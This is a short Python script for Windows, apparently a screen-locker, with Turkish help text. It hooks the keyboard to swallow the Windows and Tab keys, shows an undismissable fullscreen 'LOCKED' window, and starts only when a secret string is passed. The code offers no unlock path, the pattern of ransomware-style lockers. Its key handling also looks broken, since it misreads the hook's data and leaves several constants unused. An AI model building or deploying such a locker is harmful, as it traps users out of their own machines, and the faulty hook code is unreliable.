import ctypes
import argparse
import tkinter as tk
from ctypes import wintypes
from PIL import Image, ImageTk

# Define constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_TAB = 0x09
VK_CT = 0x11
VK_MENU = 0x12
VK_DELETE = 0x2E

LowLevelKeyboardProc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

def low_level_keyboard_proc(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        key_code = wintypes.HIWORD(lParam)
        if key_code == VK_LWIN or key_code == VK_RWIN:
            return 1
        elif key_code == VK_TAB:
            return 1
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)


hook_proc = LowLevelKeyboardProc(low_level_keyboard_proc)
def set_hook():
    hook = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, None, 0)
    return hook

def release_hook(hook):
    ctypes.windll.user32.UnhookWindowsHookEx(hook)

def disable_event():
    pass



root = tk.Tk()
root.attributes('-fullscreen', True)
root.configure(background='#FFFFFF')
root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", disable_event)
bg_label = tk.Label(root, text="LOCKED", fg="#000000", font=("helvetica", 50, "bold"))
bg_label.place(relwidth=1, relheight=1)


parser = argparse.ArgumentParser(description="Kilitleme Uygulaması.")
parser.add_argument('-t', type=str, help='Şifreleme Kodu')

args = parser.parse_args()
if args.t == "QUSJZZZZ_SNQU431jsuuq@$":
    hook = set_hook()
    root.mainloop()
    release_hook(hook)

